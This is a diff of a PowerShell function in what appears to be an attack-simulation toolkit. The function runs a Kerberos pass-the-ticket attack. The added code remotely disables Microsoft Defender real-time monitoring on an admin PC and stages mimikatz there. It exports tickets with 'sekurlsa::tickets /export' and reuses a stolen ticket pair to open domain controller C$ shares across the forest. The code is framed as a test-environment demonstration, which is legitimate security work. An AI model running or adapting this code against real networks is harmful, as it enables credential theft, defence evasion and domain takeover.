@@ -4,16 +4,14 @@ function Invoke-PassTheTicketAttack {
     Write-Log -Message "### Start Function $CurrentFunction ###"
     $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
     #################### main code | out- host #####################
-    
-    $hostname = $env:computername
 
     $Script:ASSAW = Get-ASConfig -Setting "mySAW"
+    $Script:ASTicketsUNCPath = Get-ASConfig -Setting "ticketsPath"
 
     $TicketsSourcePath = "\\$Script:ASSAW\$Script:ASTicketsUNCPath"
     $TicketsTargetPath = $Script:AS2GOTempDir
     $TicketsToAbusePath = $Script:AS2GOTicketsDir
 
-    
     $path = Get-ASConfig -Setting "Tools"
     $tool1 = join-path -path $path -childpath "mimikatz.exe"
     $tool2 = join-path -path $path -childpath "PsExec.exe"
@@ -21,13 +19,40 @@ function Invoke-PassTheTicketAttack {
     If (-not $SkipClearHost) { Clear-Host }
     
     Invoke-output -Type Header -Message "Pass-the-Ticket (PtT) Attack"
-    Invoke-output -Type Info -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `n In this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions."
+    Invoke-output -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `nIn this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions.`n"
     Invoke-output -Type Bullet -Message "Step #1 - stage mimikatz on Admin PC"
     Invoke-output -Type Bullet -Message "Step #2 - harvest tickets on Admin PC"
     Invoke-output -Type Bullet -Message "Step #3 - run PtT to become Domain Admin"
 
     #
-    If ($UnAttended) { Start-Sleep 2 } else { Pause }
+    If ($UnAttended) { Start-Sleep 2 } else { 
+    
+        $Options = @(
+            [pscustomobject] @{
+                Label = "&Yes"
+                Help  = "All prerequisites are met. Proceed with the PtT simulation."
+                Value = $Script:Yes
+            },
+            [pscustomobject] @{
+                Label = "&Skip"
+                Help  = "The Admin PC is not ready. Skip the PtT simulation."
+                Value = $Script:No
+            }
+        )
+
+        $title = "Is the Admin PC ($Script:ASSAW) ready for the Pass-the-Ticket (PtT) attack?"
+        $message = "Please confirm that the following prerequisites are met:`n  • Endpoint protection is disabled in the test environment.`n  • Fresh Kerberos tickets are available on the Admin PC."
+
+        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default 1 -Title $title
+  
+    
+        If ($decision -eq $Script:No) {
+            Invoke-Output -Type Quit -Message "Admin PC is not ready for the Pass-the-Ticket (PtT) attack."
+            return
+        }
+    }
+    
+    
     If (-not $SkipClearHost) { Clear-Host }
 
     # remove all old tickets
@@ -48,6 +73,11 @@ function Invoke-PassTheTicketAttack {
     Invoke-Output -Type Command -Message "Next Command: " -NoNewline
     $command = "Copy-Item -Path $tool1 -Destination $TicketsSourcePath  -Recurse"
     Write-Syntax -Code $command
+
+    #todo 
+    #Invoke-Command -ComputerName $computer -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}
+    #Invoke-Command -ComputerName $computer -ScriptBlock {Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled}
+    #Invoke-Command -ComputerName $computer -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $false}
 
     #cleanup
     Remove-Item -Recurse $TicketsSourcePath  -ErrorAction Ignore
@@ -83,16 +113,22 @@ function Invoke-PassTheTicketAttack {
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-
+    Invoke-Command -ComputerName $Script:ASSAW  -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
+    Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock { Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled }
     $session = New-PSSession -ComputerName $Script:ASSAW -ErrorAction Stop
     try {
         $remoteOutput = Invoke-Command -Session $session -ScriptBlock {
             Try {
-            Set-Location C:\Temp\tickets
-            .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+                #Set-MpPreference -DisableRealtimeMonitoring $true
+                Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled
+                Set-Location C:\Temp\tickets
+                .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
             }
             catch {
-                    Write-Error $_
+                Write-Error $_
+            }
+            finally {
+                Set-MpPreference -DisableRealtimeMonitoring $false
             }
         } -ErrorAction Stop
 
@@ -158,7 +194,10 @@ function Invoke-PassTheTicketAttack {
         #[pscustomobject] @{ Label = "&Cancel"; Help = "Return to main setup."; Value = "Skip" }
     )
 
-    $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
+    If (-not $UnAttended) {
+        $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
+    }
+    
     Write-Host
 
     If ($answer -eq "New") {
@@ -188,7 +227,7 @@ function Invoke-PassTheTicketAttack {
         Invoke-Output -Type Error -Message "Copying tickets from $TicketsSourcePath on the admin PC failed."
         return
     }
-    pause
+
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     #Remove-Item -Recurse $TicketsSourcePath 
     
@@ -196,12 +235,13 @@ function Invoke-PassTheTicketAttack {
 
     #$bestresult.TicketPairs   | Format-Table Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile -AutoSize
     $selectedPair = $bestresult.TicketPairs   | Select-Object -First 1
-    invoke-output -Type H1 -Message "Identified the 'best' Ticket Pair"
+
+    invoke-output -Type H1 -Message "`nBest Ticket Pair Identified"
     $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | out-host
 
     $4logfile = $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | Out-String
 
-    write-log INFO -Message "Identified the 'best' Ticket Pair: $4logfile"
+    write-log INFO -Message "Best Ticket Pair Identified: $4logfile"
 
 
     Try {
@@ -232,50 +272,41 @@ function Invoke-PassTheTicketAttack {
     
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     If (-not $SkipClearHost) { Clear-Host }
-    Write-Host "____________________________________________________________________`n" 
-    Write-Host "       Displays a list of currently cached Kerberos tickets         "
-    Write-Host "____________________________________________________________________`n" 
-    Write-Host  ""
-    Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text "klist" `
-        -Color $fgcC
-    Write-Host  ""
-    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    write-host ""
+
+    Invoke-Output -Type Header -Message "Display currently cached Kerberos tickets"
+    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
+    $command = "klist"
+    Write-Syntax -Code $command
+    
     Set-ASConfig -Setting "LastStage" -Value $Script:PtT
     Set-NewColorSchema -NewStage $Script:PtT
-   $tickets = Get-KlistTicket
+   
+    $tickets = Get-KlistTicket -Client $candidate
     $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
-    Invoke-Output -Type Info -Message "Last Ticket"
+    Invoke-Output -Type textmaker -Message "Last Ticket for client" -tm "$candidate"
     $tickets | Select-object -Last 1 | Format-List
+
+    if ($tickets.Count -eq 0) {
+        Invoke-Output -Type Error -Message "No Kerberos tickets found for client '$candidate'"
+    }
+    else {
+        Invoke-Output -Type Success -Message "Kerberos tickets found for client '$candidate'"
+    }
     
-
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     If (-not $SkipClearHost) { Clear-Host }
-    Write-Host "____________________________________________________________________`n" 
-    Write-Host "                 2nd TRY connect to DCs c$ share                    "   
-    Write-Host "____________________________________________________________________`n" 
-    write-host ""
+      
+    Invoke-Output -Type Header -Message "Attempting to access a domain controller’s C$ share in each domain"
 
-    $directory = "\\$Script:ASDC\c$"
-    Get-DirContent -Path $directory
+    Foreach ($domain in  (Get-ADForest).domains) {
+        $DC = Get-BestDomainController -Domain $domain
+        $directory = "\\$DC\c$"
+        Get-DirContent -Path $directory
+    }
+   
+    
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-    If (-not $SkipClearHost) { Clear-Host }
-    Write-Host "____________________________________________________________________`n" 
-    Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
-    Write-Host "____________________________________________________________________`n" 
-    write-host ""
-    Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\NetSess.exe ", "$Script:ASDC" `
-        -Color $fgcC, $fgcV
-    Write-Host  ""
-
-
-    Get-SessionsOnDC -server $Script:ASDC
-    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-
-    Write-Log -Message "    >> using "
     ######################## main code ############################
     $runtime = Get-RunTime -StartRunTime $StartRunTime
     Write-Log -Message "    Run Time: $runtime [h] ###"
